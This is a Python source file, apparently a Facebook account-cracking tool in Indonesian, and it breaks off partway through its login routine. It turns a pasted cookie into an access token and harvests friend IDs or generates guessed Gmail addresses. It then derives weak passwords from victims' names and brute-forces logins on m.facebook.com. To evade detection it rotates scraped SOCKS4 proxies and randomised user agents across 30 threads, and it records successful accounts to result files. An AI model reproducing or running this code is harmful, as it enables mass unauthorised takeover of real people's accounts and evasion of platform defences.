#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as executor
from rich import print as prints
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
wa=sol()
ses=requests.Session()
princp=[]
xxnx=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(1000):
	rr = random.randint
	rc = random.choice
	ipad = ['8_4_1','8_4','10_11_5','15_5','15_4_1','15_6']
	browsam = ['AirWatch Browser v4403','AirWatch Browser v22.07','AirWatch Browser v22.05','AirWatch Browser v22.02','AirWatch Browser v21.12']
	ugent1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,13))}; zh-CN; SM-G9550 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} UCBrowser/11.9.4.974 UWS/2.14.0.9 Mobile Safari/537.36 AliApp(TB/7.9.2) UCBS/2.11.1.1 TTID/10004868@taobao_android_7.9.2 WindVane/8.3.0 1080X2076"
	ugent2 = f"Mozilla/5.0 (iPad; CPU OS {str(rc(ipad))} like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 Version/7.0 Safari/9537.53 ({str(rc(browsam))})"
	ugents3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SOV36) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36"
	ugent4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko)Version/4.0 Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36 EUI Browser/5.8.018S"
	zaxxy = random.choice([ugent1,ugent2,ugents3,ugent4])
	ugen.append(zaxxy)
   
def opera():
	rr = random.randint
	rc = random.choice
	bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
	ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	jancok = rc([ua1,ua2,ua3,ua4,ua5])
	return jancok  
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
###----------[ PEWARNA ]----------###
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
J = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
asu = random.choice([m, k, h, u, b])
#WARNA PRINT IMPORT RICH#
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#FF0000]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#FFFFFF"
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
pengguna = "Premium"
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
def back():
    menu()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r>> {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(7):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
#------------------[ LOGO-LAKNAT ]-----------------#
def logo():
	clear()
	prints(nel(f"""{P2}Author : {H2}FassaFirmansyah""",width=30,style=f"{color_panel}"))
def terkumpul():
	prints(nel(f"""{P2}Mode Pesawat 5 Detik Jika Tidak Ada Hasil""",width=30,style=f"{color_panel}"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			login(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		cookie=input(f'  [{h}•{x}]Koki :{asu} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-login ]----------------#
def menu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(2)
		login_lagi334()
	os.system('clear')
	lo("\t        LOADING SYSTEM")
	logo()
	prints(nel(f"""{P2}Tools : {H2}Multi Brute Force""",width=30,style=f"{color_panel}"))
	prints(nel(f"""Tools Menu
{P2}[{color_text}01{P2}] Crack Publik   {P2}[{H2}ON{P2}]
[{color_text}02{P2}] Crack Massal  {P2} [{H2}ON{P2}]
[{color_text}03{P2}] Crack Username {P2}[{H2}ON{P2}]
[{color_text}04{P2}] Check Ressult  {P2}[{H2}ON{P2}]
[{color_text}05{P2}] Exit Program   {P2}[{H2}ON{P2}]""",width=30,style=f"{color_panel}"))
	___Sllowly_ID____ = input(f'{P}[{H}?{P}] Input : {H}')
	if ___Sllowly_ID____ in ['1']:
		idt = input(f'{P}Input ID Target : {H} ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif ___Sllowly_ID____ in ['2']:
		massal()
	elif ___Sllowly_ID____ in ['3']:
		mail2()
	elif ___Sllowly_ID____ in ['4']:
		ressult()
	elif ___Sllowly_ID____ in ['5']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		print('Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('Anda Sangat Tolol')
		back()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-------- PUBLIK V2 ---------#
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....\n"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#-------- Massal Crack ---------#
def massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'Mau Berapa ID ? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'ID Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print("Total DUMP  : "+str(len(id))) 
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
#-------- EMAIL V2 ---------#
def mail2():
	dump=[]
	rc = random.choice
	rr = random.randint
	tengah = ['irawan','wirawan','wijaya','wijayanto','ramdani','ramadan','ramadhani','ramadhan','gunawan','pratama','peratama','purnama','gunawan','hermawan','hermansyah','hermanto','kurniawan','kurnia','purnomo','sutomo','supomo','suparman','suherman','darmawan','dermawan','nugraha','saputra','syahputra','setiawan','darman','nugroho','setyawan','ardiansyah','ardiansah','ardiana','firmansyah','firmansah','dirgantara','sinaga','nasution','salmanan','lesmana','saepuloh','ferdiansah','hidayat','saepudin','saripudin','maulana','supriadi','supardi','khan','rahayu','aprilia','apriliani','fitriani','damayanti','wulandari','pratiwi','anatasya','kartika','kartini','rahmawati','pertiwi','azizah','aisyah','fatimah','handayani','nurahma','nuraisyah','nuarazizah','nursakila','nurfatimah','adinda','risawati','sulastri','mulyani','mulyati','wahyuni','sumiati','rusmiati','yulianti','yuliani','julianti','yulianto','julianto','ananda','safira','aminah','hasanah','ferawati','sumarni','anggraena','anggraeni','maharani','salsabila','sabila','evve','lestari','hungkul','nurcahaya','nurjanah','nuraminah','fatmawati','sukaesih','septiani','ningsih','nengsih','yuningsih','yunengsih','suningsih,sunengsih','nursuci','khoerunisa','ekaputri']
	belakang = ['777','999','111','222','333','444','638','656','556','452','281','812','235','898','998','110','739','892','344','87','665','81','sumarna','dermawan','darmawan','dirgantara','wijayanto','wijayanti','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','372','882','9238','194','883','809','293','251','726','332','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','82','83','766','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655',',223','332','331','313','62','63','64','65','66','67','68','gaming','123','321','332','033','721','768','988','998','901','425','719','223','7789','0018','335','827','811','880','092','064','862','6672','82','91','21','23','31','45','54','677','882','98','890','728','112','221','236','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25']
	global ok , cc
	nama = input(f'{P}[{H}?{P}] Username : ')
	if ',' in str(nama):
		print(f' {P}└─{J} masukan nama, jangan kosong ')
		time.sleep(3);exit()
	doma = '@gmail.com'
	jumlah = '5000'
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(tengah))}',f'{str(rr(0,31))}',f'{str(rc(belakang))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		if len(dump)==999999:passwrd()
	setting()	
#-------------[ CRACK-FROM-FILE ]------------------#
def file():
	try:
		fileX = input (f'{P}[{H}•{P}] Input File Anda : ')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		setting()
	except IOError:
		exit(f" {P}└─{J} ID ERROR {H}%s {J}not found"%(fileX))
#-------- HASIL CRACK ---------#
def result():
	clear()
	loading()
	logo()
	print(f'{B}[{J}01{B}] {P}Hasil {h}OK{x} Anda ')
	print(f'{B}[{J}02{B}] {P}Hasil {k}CP{x} Anda ')
	kz = input(f' └── Pilih : ')
	if kz in ['02','2']:
		
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f' {P}└─{J} file tidak di temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f' {P}└─{J} anda tidak memiliki hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[0%s] %s {K}%s {x}Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' {x}Account'+x)
			geeh = input(f' └── Pilih : ')
			
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{J} pilih yang benar...')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{J} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {K}{cpkuni[0]}{P}│{K}{cpkuni[1]}')
				nocp +=1
			
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['01','1']:
		
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f' {P}└─{J} file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' {P}└─{J} anda tidak mempunyai fileOK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {H}%s{x} Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {H} %s {x}Account'%(cih,isi,(len(hem))))
			geeh = input(f' └── Pilih : ')
			
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{J} pilih yang bener kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{J} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {h}{cpkuni[0]}{P}│{H}{cpkuni[1]}{P}│{h}{cpkuni[2]}{x}')
				nocp +=1		
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f' {P}└─{J} pilih yang bener kontol ')
		back()
###----------[ ATUR SBLUM KREK ]----------###
def setting():
	prints(nel(f"""Setting ID
{P2}[{color_text}01{P2}] ID OLD TO NEW
[{color_text}02{P2}] ID NEW TO OLD
[{color_text}03{P2}] RANDOM ID""",width=30,style=f"{color_panel}"))
	hu = input(f'{P}[{H}?{P}] Input : {H}')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua) 
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	prints(nel(f"""Setting Method
{P2}[{color_text}01{P2}] free.facebook.com
[{color_text}02{P2}] m.facebook.com
[{color_text}03{P2}] alpha.facrbook.com""",width=30,style=f"{color_panel}"))
	ngen = input(f'{P}[{H}?{P}] Input : ')
	if ngen in ['1','01']:
		method.append('metod1')
	elif ngen in ['2','02']:
		method.append('metod2')
	elif ngen in ['3','03']:
		method.append('metod3')
	else:
		method.append('metod1')
	passwrd()
	#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	terkumpul()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'metod1' in method:
				pool.submit(crack,idf,pwv)
			elif 'metod2' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'metod3' in method:
				pool.submit(bapi,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
#-------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{x}[M1] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua = opera()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=174829003346&kid_directed_site=0&app_id=174829003346&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D174829003346%26cbt%3D1713085582547%26e2e%3D%257B%2522init%2522%253A1713085582551%257D%26ies%3D0%26sdk%3Dandroid-15.0.1%26sso%3Dchrome_custom_tab%26nonce%3D1496f688-9c0d-4e82-bcae-146dc383d19b%26scope%3Dopenid%252Cpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%25225f5ec36e-0cc3-4df9-8926-fb3df7afc684%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522fbjjp9e8fks92vco8oml%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.spotify.music%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D00CNFJ9ccZ45WM9QFekEOnH9WdYuvCdt59Am-ZdP0Bw%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5f5ec36e-0cc3-4df9-8926-fb3df7afc684%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.spotify.music%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25225f5ec36e-0cc3-4df9-8926-fb3df7afc684%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522fbjjp9e8fks92vco8oml%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=174829003346&kid_directed_site=0&app_id=174829003346&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D174829003346%26cbt%3D1713085582547%26e2e%3D%257B%2522init%2522%253A1713085582551%257D%26ies%3D0%26sdk%3Dandroid-15.0.1%26sso%3Dchrome_custom_tab%26nonce%3D1496f688-9c0d-4e82-bcae-146dc383d19b%26scope%3Dopenid%252Cpublic_profile%26state%3D%257B%25220_auth_logger_id%2522%253A%25225f5ec36e-0cc3-4df9-8926-fb3df7afc684%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522fbjjp9e8fks92vco8oml%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.spotify.music%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D00CNFJ9ccZ45WM9QFekEOnH9WdYuvCdt59Am-ZdP0Bw%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5f5ec36e-0cc3-4df9-8926-fb3df7afc684%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.spotify.music%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25225f5ec36e-0cc3-4df9-8926-fb3df7afc684%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522fbjjp9e8fks92vco8oml%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr'}
